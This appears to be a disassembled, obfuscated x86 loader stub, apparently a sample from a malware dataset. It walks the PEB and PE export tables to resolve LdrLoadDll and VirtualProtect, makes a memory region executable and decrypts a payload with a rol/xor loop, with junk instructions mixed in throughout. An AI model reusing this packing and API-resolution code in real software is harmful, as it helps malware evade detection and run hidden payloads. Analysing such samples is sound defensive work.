_start
pushad
push edi
xor edi [ esp ]
sub esp 0xfffffffc
push esp
or ecx ecx
sbb edi 0xffffffff
mov eax [ esp ]
add esp 0x4
and eax eax
sbb edi 0xffffffff
and ecx ecx
sbb eax 0x4
and edx edx
sbb edi 0xffffffff
neg edi
call $+5
sub [ eax ] edi
retn
sub_10502039
xor edi edi
xor ecx ecx
or ecx edi
add cx 0xffff
stc
sbb cl 0x0
mov ch cl
xor ebp ebp
xor ebp edi
call $+5
mov eax 0x0
xor eax [ esp ]
and edx edx
adc ebp 0x1
movzx edx [ eax + ebp - 0x2 ]
call $+5
mov [ esp ] ecx
xor ecx edx
pop ecx
jne r-xdata
add [ esp ] edi
jmp [ esp ]
and edi 0x0
add edi ebp
sub_105020b7
push [ fs : 0x0 ]
add ecx eax
mov ebx 0x0
or ebx 0xffff
not esi
add ecx eax
mov [ fs : 0x0 ] esp
and ecx esi
add ecx eax
jmp r-xdata
call $+5
and edi edi
sbb ecx eax
call $+5
mov [ esp ] edi
xor edi [ esp ]
and edx edx
sbb esp 0xfffffffc
mov edi [ ecx ]
xor edx edx
xor edx 0x5a4d
and edi ebx
call $+5
mov [ esp ] edx
sub edx edi
pop edx
je r-xdata
add esp 0x4
mov edi [ esp - 0x4 ]
sub edi edi
add edi [ esp ]
mov [ fs : 0x0 ] edi
or esi esi
adc esp 0x8
push ecx
pop eax
mov edi 0x0
sub edi [ ecx + 0x3c ]
neg edi
and esi esi
adc ecx edi
and edi 0x0
or edi 0x4550
mov edx 0x0
xor edx [ ecx ]
add esp 0xfffffffc
mov [ esp ] edi
test edi edi
sbb edi edx
pop edi
jne r-xdata
jmp [ esp ]
popad
mov eax 0x1
retn 0xc
and edi 0x0
add edi [ ecx + 0x78 ]
and ecx 0x0
or ecx edi
and ecx ecx
adc ecx eax
call $+5
mov [ esp ] ecx
xor edi edi
or edi [ ecx + 0x20 ]
xor ecx ecx
xor ecx edi
add ecx eax
sub esp 0x4
mov [ esp ] eax
call $+5
mov [ esp ] ecx
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
push edx
xor edx [ esp ]
sub esp 0xfffffffc
sub eax eax
add eax esi
xor ecx ecx
add ecx [ esi ]
test ebx ebx
mov esi 0x0
adc esi ecx
call $+5
sub ebp ebp
add ebp esp
test eax eax
adc esi ebx
call $+5
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
push 0x4c72644c
xor edi edi
or edi esp
mov ecx 0x0
or ecx 0xb
[ esi ] [ edi ]
je r-xdata
and esp 0x0
add esp ebp
pop esi
push ebx
add esp 0xfffffffc
mov [ esp ] edx
pop esi
mov eax [ esp ]
add esp 0x4
mov ecx [ esp ]
add esp 0x4
xor ebx ebx
or ebx ecx
mov edi 0x0
or edi [ ecx + 0x24 ]
mov ecx 0x0
sub ecx edi
neg ecx
add ecx eax
mov edi 0x0
or edi [ ecx + esi * 2 ]
and edi 0xffff
mov esi edi
mov edi 0x0
xor edi [ ebx + 0x10 ]
and edi edi
sbb esi edi
add esi 0x1
push [ ebx + 0x1c ]
pop ecx
add ecx eax
xor edi edi
add edi [ ecx + esi * 4 ]
add eax edi
and ebp 0x0
or ebp esp
sub esp 0x4
mov [ esp ] edi
xor edi [ esp ]
or eax eax
adc esp 0x4
sub esp 0x4
mov [ esp ] edi
sub ecx ecx
add ecx esp
call $+5
mov [ esp ] edi
call $+5
mov [ esp ] 0x6c006c
add esp 0xfffffffc
mov [ esp ] 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
push 0x6c0065
call $+5
mov [ esp ] 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
push 0x1a0018
xor edx edx
or edx esp
sub esp 0x4
mov [ esp ] ecx
call $+5
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] edi
call $+5
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] eax
push ecx
pop esi
mov ebx [ esp ]
add esp 0x4
call ebx
sub eax eax
add eax [ esi ]
push eax
pop edi
xor edx edx
xor edx [ fs : 0x30 ]
push [ edx + 0x10 ]
pop eax
mov [ eax + 0x18 ] edi
mov esp 0x0
or esp ebp
mov edx 0x0
add edx [ fs : 0x30 ]
xor eax eax
or eax [ edx + 0x10 ]
mov ecx 0x0
add ecx [ eax + 0x18 ]
and eax 0x0
add eax ecx
xor edi edi
add edi [ ecx + 0x3c ]
or ebx ebx
adc ecx edi
mov edi [ ecx + 0x78 ]
xor ecx ecx
or ecx edi
add ecx eax
push ecx
mov edi 0x0
sub edi [ ecx + 0x20 ]
neg edi
xor ecx ecx
add ecx edi
and esi esi
adc ecx eax
push eax
push ecx
pop esi
pop ebx
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
test eax eax
adc esp 0x4
push esi
pop eax
sub ecx ecx
add ecx [ esi ]
and esi 0x0
add esi ecx
call $+5
test ecx ecx
mov ebp 0x0
adc ebp esp
add esi ebx
add esp 0xfffffffc
mov [ esp ] 0x7463
sub esp 0x4
mov [ esp ] 0x65746f72
add esp 0xfffffffc
mov [ esp ] 0x506c6175
push 0x74726956
and edi 0x0
or edi esp
mov ecx 0x0
xor ecx 0xf
[ esi ] [ edi ]
je r-xdata
add edx 0x1
and ecx ecx
adc eax 0x4
test ebx ebx
mov esi 0x0
adc esi [ eax ]
and edx edx
mov esp 0x0
adc esp ebp
jmp [ esp ]
mov esp 0x0
sub esp ebp
neg esp
mov esi [ esp ]
add esp 0x4
call $+5
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
add esp 0x4
mov esi [ esp - 0x4 ]
mov eax [ esp ]
add esp 0x4
pop ecx
and ebx 0x0
add ebx ecx
and edi 0x0
add edi [ ecx + 0x24 ]
sub ecx ecx
add ecx edi
add ecx eax
xor edi edi
xor edi [ ecx + esi * 2 ]
and edi 0xffff
xor esi esi
xor esi edi
test ecx ecx
mov edi 0x0
adc edi [ ebx + 0x10 ]
sub esi edi
test eax eax
sbb esi 0xffffffff
mov ecx 0x0
sub ecx [ ebx + 0x1c ]
neg ecx
or ebx ebx
adc ecx eax
push [ ecx + esi * 4 ]
pop edi
or eax eax
adc eax edi
xor ebx ebx
add ebx 0x1000
call $+5
add esp 0x4
mov ecx [ esp - 0x4 ]
and ecx 0xfffff000
add ecx ebx
and edi edi
adc ecx ebx
push ecx
test esi esi
mov edx 0x0
adc edx 0x4
call $+5
add ecx ebx
xor edi edi
or edi [ ecx ]
sub edx 0x1
je r-xdata
test edi edi
adc edx 0x1
add eax 0x4
test ebx ebx
mov esi 0x0
adc esi [ eax ]
xor esp esp
or esp ebp
jmp [ esp ]
add esp 0x4
mov edi [ esp - 0x4 ]
pop ecx
push edi
push esp
sub esp 0x4
mov [ esp ] 0x40
push 0x45db
sub esp 0x4
mov [ esp ] ecx
call $+5
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ecx
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
pop eax
add eax 0x19
call $+5
mov [ esp ] eax
sub esp 0x4
mov [ esp ] ebp
push esp
pop ebp
add ebx 0x5
jmp ebx
jmp [ esp ]
sub_10502504
add esp 0x4
mov ebx [ esp - 0x4 ]
mov edi 0x0
or edi esi
xor eax eax
or eax 0xc
add edi eax
mov esi 0x0
or esi edi
push edi
pop ebp
and ecx 0x0
or ecx 0x4539
mov edx ecx
call $+5
test ebx ebx
sbb esi 0xffffffff
add esp 0x4
mov ecx [ esp - 0x4 ]
or edi edi
sbb ecx 0x1
je r-xdata
stosb [ edi ]
pop eax
call ebp
add eax ebx
add ecx edx
popad
mov eax 0x1
retn 0xc
jmp [ esp ]
test ebx ebx
mov eax 0x0
adc eax [ esi ]
rol al cl
sub esp 0x4
mov [ esp ] edx
xor eax [ esp ]
sub esp 0xfffffffc
push ecx
mov ecx 0x40
push ebx
sub ebx ecx
pop ebx
je r-xdata
